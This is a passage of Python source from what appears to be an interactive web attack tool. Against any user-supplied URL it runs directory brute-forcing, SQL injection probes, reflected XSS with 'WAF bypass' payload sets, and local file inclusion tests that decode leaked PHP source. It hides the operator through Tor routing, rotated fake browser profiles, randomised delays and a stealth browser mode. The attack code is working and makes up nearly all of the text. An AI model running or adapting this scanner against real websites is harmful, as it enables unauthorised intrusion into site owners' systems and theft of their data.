    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        words = [w.strip() for w in f if w.strip()]
    original_threads = threads
    threads = min(threads, len(words))
    print(f"[*] Wordlist: {len(words)} entries")
    print(f"[*] Threads: {threads}")
    if original_threads > threads:
        print(f"{Colors.YELLOW}[!] Auto-adjusted: {original_threads} -> {threads}{Colors.RESET}")
    print(f"[*] Delay: {delay}s")

    baseline_len = None
    try:
        rand_path = f"notexist_{random.randint(100000, 999999)}xyz"
        profile = get_next_profile()
        r = requests.get(f"{base_url.rstrip('/')}/{rand_path}",
                         timeout=timeout, allow_redirects=True,
                         headers=profile["headers"], proxies=proxies)
        baseline_len = len(r.content)
        print(f"{Colors.CYAN}[*] Baseline (404 page): {baseline_len} bytes, status={r.status_code}{Colors.RESET}")
        if baseline_len > 0:
            print(f"{Colors.YELLOW}[!] SPA detected - filtering entries with same size as baseline{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.YELLOW}[!] Could not get baseline: {e}{Colors.RESET}")
        logger.debug(f"baseline: {type(e).__name__}: {e}")

    print("=" * 70)

    found = []
    scanned, total = 0, len(words)
    start_time = time.time()
    chunk_size = max(threads * 20, 100)

    try:
        for i in range(0, total, chunk_size):
            chunk = words[i:i + chunk_size]
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(test_directory, base_url, word, timeout, delay,
                                           proxies, ua_mode, baseline_len): word
                           for word in chunk}
                for future in as_completed(futures):
                    scanned += 1
                    progress_bar(scanned, total)
                    result = future.result()
                    if result:
                        found.append(result)
                        color = STATUS_COLORS.get(result["status"], Colors.WHITE)
                        with print_lock:
                            sys.stdout.write("\r" + " " * 100 + "\r")
                            sys.stdout.flush()
                            loc = f" -> {result['location']}" if result.get('location') else ""
                            print(f"{color}[{result['status']}]{Colors.RESET} {result['url']} "
                                  f"{Colors.DIM}({result['length']} bytes){loc}{Colors.RESET}")
    except KeyboardInterrupt:
        print(Colors.YELLOW + "\n[!] Scan interrupted." + Colors.RESET)

    sys.stdout.write("\r" + " " * 100 + "\r")
    sys.stdout.flush()
    elapsed = time.time() - start_time
    print("=" * 70)
    print(f"\n[+] Found: {len(found)} entries")
    print(f"[+] Time: {elapsed:.2f}s")
    return found


def run_directory_buster():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""{Colors.CYAN}{Colors.BOLD}
    ╔════════════════════════════════════════╗
    ║       DIRECTORY BUSTER                 ║
    ╚════════════════════════════════════════╝
    {Colors.RESET}""")
    url = typed_input(Colors.AQUA + "[?] Enter URL: " + Colors.RESET).strip()
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    elif url.startswith("http://"):
        print(f"{Colors.YELLOW}[!] Auto-upgrading to HTTPS...{Colors.RESET}")
        url = url.replace("http://", "https://", 1)
    wordlist = typed_input(Colors.AQUA + "[?] Wordlist path: " + Colors.RESET).strip()
    if not wordlist or not os.path.exists(wordlist):
        print(Colors.RED + f"[!] File not found: {wordlist}" + Colors.RESET)
        return
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        wordlist_size = len([w for w in f if w.strip()])

    conn = select_db_connection()
    proxies = None

    if conn["mode"] == "tor":
        tor_res = enable_tor()
        if tor_res["connected"]:
            proxies = {
                "http": "socks5h://127.0.0.1:9050",
                "https": "socks5h://127.0.0.1:9050",
            }
            disable_tor()
        else:
            print(Colors.RED + "[!] Tor not available, continuing WITHOUT proxy" + Colors.RESET)
            disable_tor()
    elif conn["mode"] == "proxy":
        proxies = conn["proxies"]

    ua_mode = select_user_agent_mode()
    threads, delay, speed_label = select_db_speed(wordlist_size)
    found = directory_buster(url, wordlist, threads, delay, 10, speed_label, proxies, ua_mode)

    print()
    print(f"{Colors.CYAN}{'-' * 70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}Results:{Colors.RESET}")
    for r in sorted(found, key=lambda x: x["status"]):
        color = STATUS_COLORS.get(r["status"], Colors.WHITE)
        print(f"  {color}[{r['status']}]{Colors.RESET} {r['url']}")

    save = typed_input(f"\n{Colors.AQUA}[?] Save results? [y/n]: " + Colors.RESET).strip().lower()
    if save == "y":
        filename = f"dirbust_{_safe_filename(url)}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"Target: {url}\nConnection: {conn['mode']}\nSpeed: {speed_label}\n")
            f.write(f"Threads: {threads}\nDelay: {delay}s\nFound: {len(found)}\n\n")
            for r in found:
                f.write(f"[{r['status']}] {r['url']} ({r['length']} bytes)\n")
        print(Colors.GREEN + f"[+] Saved: {filename}" + Colors.RESET)
    input(Colors.DIM_GRAY + "\n[Press Enter to return] " + Colors.RESET)


def auto_build_url(user_input):
    if "://" not in user_input:
        user_input = "http://" + user_input
    if "?" not in user_input:
        print(f"\n{Colors.YELLOW}[!] No parameters found in URL{Colors.RESET}")
        print(f"{Colors.DIM_GRAY}[*] Add a parameter to test{Colors.RESET}")
        param = typed_input(Colors.AQUA + "[?] Enter parameter (e.g., id=1): " + Colors.RESET).strip()
        if not param:
            return None
        if "=" not in param:
            param = f"{param}=1"
        user_input = f"{user_input}?{param}"
    return user_input


def find_parameters(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return list(params.keys()) if params else []


def build_url_with_payload(base_url, param, payload):
    from urllib.parse import quote
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    parts = []
    for k, vals in params.items():
        for v in vals:
            if k == param:
                parts.append(f"{k}={quote(payload, safe='%')}")
            else:
                parts.append(f"{k}={quote(v, safe='%')}")
    new_query = "&".join(parts)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                       parsed.params, new_query, parsed.fragment))


def get_baseline(url, proxies=None, timeout=5):
    profile = get_faker_profile() if HAS_FAKER else get_next_profile()
    try:
        r = requests.get(url, timeout=timeout, headers=profile["headers"],
                         proxies=proxies, allow_redirects=True)
        return {"status": r.status_code, "length": len(r.content)}
    except Exception as e:
        logger.debug(f"get_baseline: {type(e).__name__}: {e}")
        return None


def test_error_based(url, param, proxies=None, timeout=5, delay=0.2):
    findings = []
    baseline_text = ""
    try:
        baseline_url = build_url_with_payload(url, param, "1")
        profile = get_faker_profile() if HAS_FAKER else get_next_profile()
        r = requests.get(baseline_url, timeout=timeout, headers=profile["headers"],
                         proxies=proxies, allow_redirects=True)
        baseline_text = r.text.lower()
    except Exception as e:
        logger.debug(f"test_error_based baseline: {type(e).__name__}: {e}")
    active_keywords = [kw for kw in ERROR_KEYWORDS if kw not in baseline_text]

    print(f"\n    {Colors.CYAN}[*] Testing Error-Based ({len(ERROR_PAYLOADS)} payloads)...{Colors.RESET}")
    print(f"        {Colors.DIM_GRAY}Active keywords: {len(active_keywords)}/{len(ERROR_KEYWORDS)}{Colors.RESET}")

    for i, payload in enumerate(ERROR_PAYLOADS, 1):
        if delay > 0:
            time.sleep(random.uniform(delay * 0.5, delay * 1.5))
        test_url = build_url_with_payload(url, param, payload)
        try:
            profile = get_faker_profile() if HAS_FAKER else get_next_profile()
            r = requests.get(test_url, timeout=timeout, headers=profile["headers"],
                             proxies=proxies, allow_redirects=True)
            content_lower = r.text.lower()
            for keyword in active_keywords:
                if keyword in content_lower:
                    findings.append({"type": "Error-Based", "payload": payload,
                                     "evidence": keyword, "url": test_url})
                    print(f"        {Colors.RED}[+] [{i}/{len(ERROR_PAYLOADS)}] "
                          f"{payload[:40]} -> {keyword}{Colors.RESET}")
                    break
        except Exception as e:
            logger.debug(f"test_error_based payload {i}: {type(e).__name__}: {e}")
            continue
    if not findings:
        print(f"        {Colors.DIM_GRAY}No error-based findings{Colors.RESET}")
    return findings


def test_time_based(url, param, proxies=None, timeout=15, delay=0.2):
    findings = []
    print(f"\n    {Colors.CYAN}[*] Measuring baseline response time...{Colors.RESET}")
    baseline_time = None
    try:
        baseline_url = build_url_with_payload(url, param, "1")
        profile = get_faker_profile() if HAS_FAKER else get_next_profile()
        start = time.time()
        requests.get(baseline_url, timeout=timeout, headers=profile["headers"],
                     proxies=proxies, allow_redirects=True)
        baseline_time = time.time() - start
        print(f"        {Colors.DIM_GRAY}Baseline: {baseline_time:.2f}s{Colors.RESET}")
    except Exception as e:
        print(f"        {Colors.RED}Baseline failed: {e}{Colors.RESET}")
        logger.debug(f"test_time_based baseline: {type(e).__name__}: {e}")
        return findings

    threshold = baseline_time + 3.5
    print(f"        {Colors.DIM_GRAY}Threshold: {threshold:.2f}s{Colors.RESET}")
    print(f"    {Colors.CYAN}[*] Testing Time-Based ({len(TIME_PAYLOADS)} payloads)...{Colors.RESET}")

    for i, payload in enumerate(TIME_PAYLOADS, 1):
        if delay > 0:
            time.sleep(random.uniform(delay * 0.5, delay * 1.5))
        test_url = build_url_with_payload(url, param, payload)
        try:
            profile = get_faker_profile() if HAS_FAKER else get_next_profile()
            start = time.time()
            requests.get(test_url, timeout=timeout, headers=profile["headers"],
                         proxies=proxies, allow_redirects=True)
            elapsed = time.time() - start
            if elapsed >= threshold:
                findings.append({"type": "Time-Based", "payload": payload,
                                 "evidence": f"Response took {elapsed:.2f}s "
                                             f"(baseline {baseline_time:.2f}s)",
                                 "url": test_url})
                print(f"        {Colors.RED}[+] [{i}/{len(TIME_PAYLOADS)}] "
                      f"{payload[:40]} -> {elapsed:.2f}s{Colors.RESET}")
        except Exception as e:
            logger.debug(f"test_time_based payload {i}: {type(e).__name__}: {e}")
            continue
    if not findings:
        print(f"        {Colors.DIM_GRAY}No time-based findings{Colors.RESET}")
    return findings


def test_boolean_based(url, param, proxies=None, timeout=5, delay=0.2):
    findings = []
    baseline_len = None
    try:
        baseline_url = build_url_with_payload(url, param, "1")
        profile = get_faker_profile() if HAS_FAKER else get_next_profile()
        r = requests.get(baseline_url, timeout=timeout, headers=profile["headers"],
                         proxies=proxies, allow_redirects=True)
        baseline_len = len(r.content)
        print(f"\n    {Colors.CYAN}[*] Baseline length: {baseline_len} bytes{Colors.RESET}")
    except Exception as e:
        logger.debug(f"test_boolean_based baseline: {type(e).__name__}: {e}")

    print(f"    {Colors.CYAN}[*] Testing Boolean-Based ({len(BOOLEAN_PAYLOADS)} pairs)...{Colors.RESET}")

    for i, (true_payload, false_payload) in enumerate(BOOLEAN_PAYLOADS, 1):
        if delay > 0:
            time.sleep(random.uniform(delay * 0.5, delay * 1.5))
        true_url = build_url_with_payload(url, param, true_payload)
        false_url = build_url_with_payload(url, param, false_payload)
        try:
            p1 = get_faker_profile() if HAS_FAKER else get_next_profile()
            r_true = requests.get(true_url, timeout=timeout, headers=p1["headers"],
                                  proxies=proxies, allow_redirects=True)
            if delay > 0:
                time.sleep(random.uniform(delay * 0.5, delay * 1.5))
            p2 = get_faker_profile() if HAS_FAKER else get_next_profile()
            r_false = requests.get(false_url, timeout=timeout, headers=p2["headers"],
                                   proxies=proxies, allow_redirects=True)

            diff = abs(len(r_true.content) - len(r_false.content))
            if diff < 100:
                continue
            if len(r_true.content) == 0 or len(r_false.content) == 0:
                continue
            if baseline_len:
                true_diff = abs(len(r_true.content) - baseline_len)
                false_diff = abs(len(r_false.content) - baseline_len)
                if false_diff <= true_diff:
                    continue

            findings.append({"type": "Boolean-Based",
                             "payload": f"{true_payload} / {false_payload}",
                             "evidence": f"Length diff: {diff} bytes",
                             "url": true_url})
            print(f"        {Colors.RED}[+] [{i}/{len(BOOLEAN_PAYLOADS)}] "
                  f"diff: {diff} bytes{Colors.RESET}")
        except Exception as e:
            logger.debug(f"test_boolean_based pair {i}: {type(e).__name__}: {e}")
            continue
    if not findings:
        print(f"        {Colors.DIM_GRAY}No boolean-based findings{Colors.RESET}")
    return findings


def test_parameter(url, param, proxies=None, timeout=5, test_boolean=True, test_time=True, delay=0.2):
    print(f"\n{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}[*] Testing parameter: {Colors.YELLOW}{param}{Colors.RESET}")
    print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    findings = []
    findings.extend(test_error_based(url, param, proxies, timeout, delay))
    if test_boolean:
        findings.extend(test_boolean_based(url, param, proxies, timeout, delay))
    if test_time and not findings:
        findings.extend(test_time_based(url, param, proxies, timeout, delay))
    return {"param": param, "findings": findings}


def scan_sqli_url(url, proxies=None, timeout=5, test_boolean=True, test_time=True, delay=0.2):
    print(f"\n{Colors.GOLD}[*] Target: {url}{Colors.RESET}")
    params = find_parameters(url)
    if not params:
        print(f"{Colors.RED}[!] No parameters found in URL{Colors.RESET}")
        return []
    print(f"{Colors.GREEN}[+] Found {len(params)} parameter(s): {', '.join(params)}{Colors.RESET}")
    all_results = []
    for param in params:
        result = test_parameter(url, param, proxies, timeout, test_boolean, test_time, delay)
        if result["findings"]:
            all_results.append(result)
    return all_results


def generate_xss_token():
    return f"xss{random.randint(100000, 999999)}xss"


def build_xss_payload(template, token):
    if "'XSS'" in template:
        return template.replace("'XSS'", f"'{token}'")
    if '"XSS"' in template:
        return template.replace('"XSS"', f'"{token}"')
    result = template
    result = re.sub(r'alert\([^)]*\)', f"alert('{token}')", result)
    result = re.sub(r'confirm\([^)]*\)', f"confirm('{token}')", result)
    result = re.sub(r'prompt\([^)]*\)', f"prompt('{token}')", result)
    if token not in result:
        result = result + f"<!--{token}-->"
    return result


def get_payloads_for_mode(mode):
    if mode == "insane":
        all_payloads = []
        for cat in XSS_PAYLOADS.values():
            all_payloads.extend(cat)
        return all_payloads
    elif mode in PRESETS:
        payloads = []
        for cat in PRESETS[mode]:
            payloads.extend(XSS_PAYLOADS[cat])
        return payloads
    return []


def is_tag_encoded(html_content, tag_name):
    from urllib.parse import quote
    html_lower = html_content.lower()
    tag_lower = tag_name.lower()
    if f"<{tag_lower}" in html_lower:
        return False
    if f"&lt;{tag_lower}" in html_lower:
        return True
    encoded_tag = quote(f"<{tag_lower}", safe='').lower()
    if encoded_tag in html_lower:
        return True
    double_encoded = quote(quote(f"<{tag_lower}", safe=''), safe='').lower()
    if double_encoded in html_lower:
        return True
    return None


def check_lfi_response(response_text, baseline_text):
    findings = []
    response_lower = response_text.lower()
    baseline_lower = baseline_text.lower() if baseline_text else ""

    for category, signatures in LFI_SIGNATURES.items():
        for sig in signatures:
            sig_lower = sig.lower()
            if sig_lower in response_lower and sig_lower not in baseline_lower:
                findings.append({
                    "category": category,
                    "signature": sig,
                })
                break

    if "php://filter/convert.base64-encode" in response_text or len(response_text) > 500:
        matches = PHP_BASE64_RE.findall(response_text)
        for m in matches:
            if len(m) > 200:
                try:
                    import base64 as _b64
                    decoded = _b64.b64decode(m + "==").decode(errors="ignore")
                    if "<?php" in decoded or "<?=" in decoded:
                        findings.append({
                            "category": "php_source_decoded",
                            "signature": decoded[:200],
                        })
                        break
                except Exception:
                    pass

    return findings


def test_reflected_xss(url, param, payloads, proxies=None, timeout=8, delay=0.2,
                       use_playwright=False, tor_rotation=False):
    findings = []
    token = generate_xss_token()
    total = len(payloads)

    mode_label = "Playwright (Stealth)" if use_playwright else "Requests"

    print(f"\n    {Colors.CYAN}[*] Testing Reflected XSS ({total} payloads)...{Colors.RESET}")
    print(f"        {Colors.DIM_GRAY}Token: {token}{Colors.RESET}")
    print(f"        {Colors.DIM_GRAY}Mode: {mode_label}{Colors.RESET}")

    print(f"        {Colors.DIM_GRAY}[*] Getting baseline...{Colors.RESET}")
    baseline_text = ""
    baseline_status = 0
    baseline_len = 0
    try:
        baseline_url = build_url_with_payload(url, param, "test123xyz")
        p = get_faker_profile() if HAS_FAKER else get_next_profile()
        r_base = requests.get(
            baseline_url, timeout=timeout,
            headers=p["headers"], proxies=proxies,
            allow_redirects=False
        )
        baseline_text = r_base.text
        baseline_status = r_base.status_code
        baseline_len = len(r_base.content)
        print(f"        {Colors.DIM_GRAY}[*] Baseline: status={baseline_status}, len={baseline_len}{Colors.RESET}")
    except Exception as e:
        logger.debug(f"test_reflected_xss baseline: {type(e).__name__}: {e}")

    test_urls = []
    payload_map = {}
    for payload_template, payload_name in payloads:
        payload = build_xss_payload(payload_template, token)
        test_url = build_url_with_payload(url, param, payload)
        test_urls.append(test_url)
        payload_map[test_url] = (payload, payload_name)

    if use_playwright and HAS_PLAYWRIGHT:
        tor_label = " + Tor" if (proxies and any("9050" in str(v) for v in proxies.values())) else ""
        print(f"        {Colors.DIM_GRAY}Loading {total} URLs with browser{tor_label}...{Colors.RESET}")
        results = fetch_all_with_playwright(
            test_urls, timeout=timeout, proxies=proxies,
            tor_rotation=tor_rotation
        )

        for i, test_url in enumerate(test_urls, 1):
            payload, payload_name = payload_map[test_url]
            result = results.get(test_url)

            if not result:
                with print_lock:
                    print(f"        {Colors.DIM_GRAY}[x] [{i}/{total}] {payload_name} -> error{Colors.RESET}")
                continue

            response_text = result["text"]
            status = result.get("status", 0)

            if status in [403, 429, 503]:
                with print_lock:
                    print(
                        f"        {Colors.YELLOW}[!] [{i}/{total}] {payload_name} -> blocked ({status}){Colors.RESET}")
                continue

            if token not in response_text:
                continue

            if payload in response_text:
                findings.append({
                    "type": "Reflected XSS",
                    "payload": payload,
                    "payload_type": payload_name,
                    "evidence": f"Full payload reflected (Status: {status})",
                    "severity": "HIGH",
                    "url": test_url,
                })
                with print_lock:
                    print(f"        {Colors.RED}[+] [{i}/{total}] {payload_name} -> REFLECTED!{Colors.RESET}")
            else:
                tag_match = re.search(r'<(\w+)', payload)
                if tag_match:
                    tag_name = tag_match.group(1).lower()
                    encoded = is_tag_encoded(response_text, tag_name)
                    if encoded is False:
                        findings.append({
                            "type": "Reflected XSS (Partial)",
                            "payload": payload,
                            "payload_type": payload_name,
                            "evidence": f"Tag <{tag_name}> reflected (Stealth)",
                            "severity": "MEDIUM",
                            "url": test_url,
                        })
                        with print_lock:
                            print(f"        {Colors.YELLOW}[?] [{i}/{total}] {payload_name} -> PARTIAL{Colors.RESET}")
                    else:
                        with print_lock:
                            print(f"        {Colors.DIM_GRAY}[-] [{i}/{total}] {payload_name} -> encoded{Colors.RESET}")

        if not findings:
            print(f"        {Colors.DIM_GRAY}No reflected XSS found{Colors.RESET}")
        return findings

    for i, test_url in enumerate(test_urls, 1):
        payload, payload_name = payload_map[test_url]

        if delay > 0:
            time.sleep(random.uniform(delay * 0.5, delay * 1.5))

        try:
            headers = (get_faker_profile() if HAS_FAKER else get_next_profile())["headers"]
            r = requests.get(
                test_url, timeout=timeout, headers=headers,
                proxies=proxies, allow_redirects=False  # ← مهم!
            )

            if r.status_code in [403, 429, 503]:
                with print_lock:
                    print(
                        f"        {Colors.YELLOW}[!] [{i}/{total}] {payload_name} -> blocked ({r.status_code}){Colors.RESET}")
                continue

            # چک ریدایرکت
            if r.status_code in [301, 302, 303, 307, 308]:
                with print_lock:
                    print(
                        f"        {Colors.DIM_GRAY}[~] [{i}/{total}] {payload_name} -> redirect ({r.status_code}){Colors.RESET}")
                continue

            # اگه توکن توی پاسخ نبود
            if token not in r.text:
                with print_lock:
                    print(f"        {Colors.DIM_GRAY}[-] [{i}/{total}] {payload_name} -> no reflection{Colors.RESET}")
                continue

            # اگه پیلود کامل منعکس شده
            if payload in r.text:
                findings.append({
                    "type": "Reflected XSS",
                    "payload": payload,
                    "payload_type": payload_name,
                    "evidence": f"Full payload reflected (Status: {r.status_code})",
                    "severity": "HIGH",
                    "url": test_url,
                })
                with print_lock:
                    print(f"        {Colors.RED}[+] [{i}/{total}] {payload_name} -> REFLECTED!{Colors.RESET}")
            else:
                # چک جزئی
                tag_match = re.search(r'<(\w+)', payload)
                if tag_match:
                    tag_name = tag_match.group(1).lower()
                    encoded = is_tag_encoded(r.text, tag_name)
                    if encoded is False:
                        findings.append({
                            "type": "Reflected XSS (Partial)",
                            "payload": payload,
                            "payload_type": payload_name,
                            "evidence": f"Tag <{tag_name}> reflected",
                            "severity": "MEDIUM",
                            "url": test_url,
                        })
                        with print_lock:
                            print(f"        {Colors.YELLOW}[?] [{i}/{total}] {payload_name} -> PARTIAL{Colors.RESET}")
                    else:
                        with print_lock:
                            print(f"        {Colors.DIM_GRAY}[-] [{i}/{total}] {payload_name} -> encoded{Colors.RESET}")
        except requests.exceptions.Timeout:
            with print_lock:
                print(f"        {Colors.YELLOW}[T] [{i}/{total}] {payload_name} -> timeout{Colors.RESET}")
        except Exception as e:
            logger.debug(f"test_reflected_xss {i}: {type(e).__name__}: {e}")
            continue

    if not findings:
        print(f"        {Colors.DIM_GRAY}No reflected XSS found{Colors.RESET}")
    return findings


def test_lfi_parameter(url, param, payloads, proxies=None, timeout=8, delay=0.2):
    findings = []
    baseline_text = ""
    baseline_status = 0
    baseline_len = 0

    print(f"\n    {Colors.CYAN}[*] Getting baseline for LFI...{Colors.RESET}")
    try:
        baseline_url = build_url_with_payload(url, param, "test123xyz")
        p = get_faker_profile() if HAS_FAKER else get_next_profile()
        r_base = requests.get(
            baseline_url, timeout=timeout,
            headers=p["headers"], proxies=proxies,
            allow_redirects=False
        )
        baseline_text = r_base.text
        baseline_status = r_base.status_code
        baseline_len = len(r_base.content)
        print(f"        {Colors.DIM_GRAY}[*] Baseline: status={baseline_status}, len={baseline_len}{Colors.RESET}")
    except Exception as e:
        logger.debug(f"test_lfi_parameter baseline: {type(e).__name__}: {e}")

    total = len(payloads)
    print(f"    {Colors.CYAN}[*] Testing LFI ({total} payloads)...{Colors.RESET}")

    for i, payload in enumerate(payloads, 1):
        if delay > 0:
            time.sleep(random.uniform(delay * 0.5, delay * 1.5))

        test_url = build_url_with_payload(url, param, payload)

        try:
            headers = (get_faker_profile() if HAS_FAKER else get_next_profile())["headers"]
            r = requests.get(
                test_url, timeout=timeout, headers=headers,
                proxies=proxies, allow_redirects=False
            )

            if r.status_code in [403, 429, 503]:
                with print_lock:
                    print(f"        {Colors.YELLOW}[!] [{i}/{total}] blocked ({r.status_code}){Colors.RESET}")
                continue

            if r.status_code in [301, 302, 303, 307, 308]:
                with print_lock:
                    print(f"        {Colors.DIM_GRAY}[~] [{i}/{total}] redirect ({r.status_code}){Colors.RESET}")
                continue

            response_text = r.text
            hits = check_lfi_response(response_text, baseline_text)

            if hits:
                for hit in hits:
                    findings.append({
                        "type": "LFI",
                        "payload": payload,
                        "category": hit["category"],
                        "evidence": hit["signature"][:100],
                        "severity": "HIGH",
                        "url": test_url,
                        "status": r.status_code,
                    })
                with print_lock:
                    print(
                        f"        {Colors.RED}[+] [{i}/{total}] {payload[:40]} -> {hits[0]['category']}{Colors.RESET}")
            else:
                if baseline_len > 0 and abs(len(r.content) - baseline_len) > 300 and r.status_code == baseline_status:
                    with print_lock:
                        print(
                            f"        {Colors.YELLOW}[?] [{i}/{total}] {payload[:40]} -> size diff ({len(r.content)} vs {baseline_len}){Colors.RESET}")
                else:
                    with print_lock:
                        print(f"        {Colors.DIM_GRAY}[-] [{i}/{total}] {payload[:40]} -> no hit{Colors.RESET}")

        except requests.exceptions.Timeout:
            with print_lock:
                print(f"        {Colors.YELLOW}[T] [{i}/{total}] timeout{Colors.RESET}")
        except Exception as e:
            logger.debug(f"test_lfi_parameter {i}: {type(e).__name__}: {e}")
            continue

    if not findings:
        print(f"        {Colors.DIM_GRAY}No LFI found{Colors.RESET}")
    return findings


def test_dom_xss(url, proxies=None, timeout=8):
    findings = []

    print(f"\n    {Colors.CYAN}[*] Analyzing DOM-based XSS (static)...{Colors.RESET}")

    try:
        profile = get_faker_profile() if HAS_FAKER else get_next_profile()
        r = requests.get(url, timeout=timeout, headers=profile["headers"],
                         proxies=proxies, allow_redirects=True)
        html = r.text.lower()

        sources_found = [src for src in DOM_SOURCES if src.lower() in html]
        sinks_found = [sink for sink in DOM_SINKS if sink.lower() in html]

        if sources_found and sinks_found:
            findings.append({
                "type": "DOM-based XSS (Potential)",
                "payload": "N/A (static analysis)",
                "payload_type": "dom-analysis",
                "evidence": f"Sources: {', '.join(sources_found[:3])} | "
                            f"Sinks: {', '.join(sinks_found[:3])}",
                "severity": "MEDIUM",
                "url": url,
            })
            print(f"        {Colors.YELLOW}[!] Potential DOM XSS detected{Colors.RESET}")
            print(f"        {Colors.DIM_GRAY}    Sources: {', '.join(sources_found[:3])}{Colors.RESET}")
            print(f"        {Colors.DIM_GRAY}    Sinks:   {', '.join(sinks_found[:3])}{Colors.RESET}")
        else:
            print(f"        {Colors.DIM_GRAY}No obvious DOM XSS indicators{Colors.RESET}")
    except Exception as e:
        print(f"        {Colors.RED}[-] Error: {e}{Colors.RESET}")
        logger.debug(f"test_dom_xss: {type(e).__name__}: {e}")

    return findings


def test_xss_parameter(url, param, payloads, proxies=None, timeout=8, delay=0.2,
                       dom_check=True, use_playwright=False, tor_rotation=False):
    print(f"\n{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}[*] Testing parameter: {Colors.YELLOW}{param}{Colors.RESET}")
    print(f"{Colors.NEON_CYAN}{'=' * 60}{Colors.RESET}")

    findings = []
    findings.extend(test_reflected_xss(
        url, param, payloads, proxies, timeout, delay,
        use_playwright=use_playwright,
        tor_rotation=tor_rotation
    ))
    if not findings and dom_check:
        findings.extend(test_dom_xss(url, proxies, timeout))
    return {"param": param, "findings": findings}


def scan_xss_url(url, payloads, proxies=None, timeout=8, delay=0.2,
                 dom_check=True, use_playwright=False, tor_rotation=False):
    print(f"\n{Colors.GOLD}[*] Target: {url}{Colors.RESET}")
    params = find_parameters(url)
    if not params:
        print(f"{Colors.RED}[!] No parameters found in URL{Colors.RESET}")
        return []
    print(f"{Colors.GREEN}[+] Found {len(params)} parameter(s): {', '.join(params)}{Colors.RESET}")

    all_results = []
    for param in params:
        result = test_xss_parameter(
            url, param, payloads, proxies, timeout, delay,
            dom_check, use_playwright, tor_rotation
        )
        if result["findings"]:
            all_results.append(result)
    return all_results


def select_xss_payloads():
    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT SCAN INTENSITY{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")

    basic_count = len(XSS_PAYLOADS["basic"])
    waf_count = len(XSS_PAYLOADS["waf_bypass"])
    event_count = len(XSS_PAYLOADS["event_handler"])
    enc_count = len(XSS_PAYLOADS["encoding"])
    spec_count = len(XSS_PAYLOADS["special"])

    quick_n = basic_count
    normal_n = basic_count + waf_count
    deep_n = basic_count + waf_count + event_count
    insane_n = basic_count + waf_count + event_count + enc_count + spec_count

    print(f"  {Colors.GREEN}1){Colors.RESET} Quick      {Colors.DIM}({quick_n} payloads){Colors.RESET}")
    print(f"  {Colors.GREEN}2){Colors.RESET} Normal     {Colors.DIM}({normal_n} payloads){Colors.RESET}")
    print(f"  {Colors.GREEN}3){Colors.RESET} Deep       {Colors.DIM}({deep_n} payloads){Colors.RESET}")
    print(f"  {Colors.GREEN}4){Colors.RESET} Insane     {Colors.DIM}({insane_n} payloads){Colors.RESET}")
    print(f"  {Colors.GREEN}5){Colors.RESET} Custom     {Colors.DIM}(choose categories){Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")

    choice = typed_input(Colors.AQUA + "[?] Choose (1-5): " + Colors.RESET).strip()

    if choice == "1":
        return get_payloads_for_mode("quick"), "Quick", quick_n
    elif choice == "2":
        return get_payloads_for_mode("normal"), "Normal", normal_n
    elif choice == "3":
        return get_payloads_for_mode("deep"), "Deep", deep_n
    elif choice == "4":
        return get_payloads_for_mode("insane"), "Insane", insane_n
    elif choice == "5":
        return select_custom_payloads()
    return get_payloads_for_mode("normal"), "Normal", normal_n


def select_custom_payloads():
    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT PAYLOAD CATEGORIES{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(
        f"  {Colors.GREEN}1){Colors.RESET} Basic         {Colors.DIM}({len(XSS_PAYLOADS['basic'])} payloads){Colors.RESET}")
    print(
        f"  {Colors.GREEN}2){Colors.RESET} WAF Bypass    {Colors.DIM}({len(XSS_PAYLOADS['waf_bypass'])} payloads){Colors.RESET}")
    print(
        f"  {Colors.GREEN}3){Colors.RESET} Event Handler {Colors.DIM}({len(XSS_PAYLOADS['event_handler'])} payloads){Colors.RESET}")
    print(
        f"  {Colors.GREEN}4){Colors.RESET} Encoding      {Colors.DIM}({len(XSS_PAYLOADS['encoding'])} payloads){Colors.RESET}")
    print(
        f"  {Colors.GREEN}5){Colors.RESET} Special       {Colors.DIM}({len(XSS_PAYLOADS['special'])} payloads){Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.DIM_GRAY}  Example: 1,3,5  or  all{Colors.RESET}")
    print()

    choice = typed_input(Colors.AQUA + "[?] Categories: " + Colors.RESET).strip().lower()

    if choice == "all":
        return get_payloads_for_mode("insane"), "Custom (all)", len(get_payloads_for_mode("insane"))

    mapping = {"1": "basic", "2": "waf_bypass", "3": "event_handler",
               "4": "encoding", "5": "special"}

    selected = []
    for c in choice.replace(" ", "").split(","):
        if c in mapping:
            selected.append(mapping[c])

    if not selected:
        print(f"{Colors.RED}[!] No valid categories selected. Using Normal.{Colors.RESET}")
        return get_payloads_for_mode("normal"), "Normal", len(get_payloads_for_mode("normal"))

    payloads = []
    for cat in selected:
        payloads.extend(XSS_PAYLOADS[cat])

    label = f"Custom ({', '.join(selected)})"
    return payloads, label, len(payloads)


def get_lfi_payloads(mode="normal"):
    if mode == "quick":
        return LFI_PAYLOADS["basic"], "Quick", len(LFI_PAYLOADS["basic"])
    elif mode == "normal":
        p = LFI_PAYLOADS["basic"] + LFI_PAYLOADS["bypass"]
        return p, "Normal", len(p)
    elif mode == "deep":
